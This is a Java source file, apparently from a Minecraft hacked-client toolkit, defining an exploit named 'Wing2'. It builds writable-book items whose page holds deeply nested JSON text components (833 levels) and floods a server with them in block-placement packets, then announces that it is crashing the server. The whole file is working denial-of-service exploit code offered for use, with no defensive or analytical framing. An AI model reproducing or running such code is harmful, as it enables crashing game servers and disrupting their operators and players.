package pl.oucik.phecdateam.rebuild.exploit.impl.nbt;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;
import org.apache.commons.lang3.RandomStringUtils;
import pl.oucik.phecdateam.rebuild.exploit.Exploit;
import pl.oucik.phecdateam.rebuild.exploit.ExploitInfo;
import pl.oucik.phecdateam.rebuild.exploit.ExploitType;
import pl.oucik.phecdateam.rebuild.exploit.argument.Argument;
import pl.oucik.phecdateam.rebuild.helper.ChatHelper;

import java.util.Random;


@ExploitInfo(
    name = "Wing2",
    type = ExploitType.NBT
)
public class Wing2 extends Exploit<ItemStack> {

  public Wing2() {
    super(() -> {
      ItemStack itemStack = new ItemStack(Items.writable_book);
      NBTTagCompound compound = new NBTTagCompound();
      NBTTagList pages = new NBTTagList();

      for (int i = 0; i < 50; i++) {
        pages.appendTag(new NBTTagString(RandomStringUtils.randomAlphabetic(200)));
      }

      compound.setTag("pages", pages);
      itemStack.setTagCompound(compound);
      return itemStack;
    }, new Argument("packets", 0, Integer.class));
  }

  @Override
  public void execute(Object... args) {
    int packets = (Integer) args[0];
    long start = System.currentTimeMillis();
    (new Thread(() -> {
      for (int i = 0; i < packets; ++i) {
        NBTTagCompound tag = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        StringBuilder value = new StringBuilder();
        value.append("{");
        int bvalue = 833;

        int i2;
        for (i2 = 0; i2 < bvalue; ++i2) {
          value.append("extra:[{");
        }

        for (i2 = 0; i2 < bvalue; ++i2) {
          value.append("text:\u2F9F}],");
        }
        value.append("text:\u2F9F}");
        list.appendTag(new NBTTagString(value.toString()));
        tag.setString("author", Minecraft.getMinecraft().getSession().getUsername());
        tag.setString("title", "gg");
        tag.setByte("resolved", (byte) 1);
        tag.setTag("pages", list);
        ItemStack book = new ItemStack(Items.writable_book);
        book.setTagCompound(tag);
        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 0.0D, Minecraft.getMinecraft().thePlayer.posZ), 2, book, 0.0F, 0.0F, 0.0F));
      }
    ChatHelper.printMessage(String.format("&C&LCrashing server with method &4&lWing2"));
    })).start();
  }
}
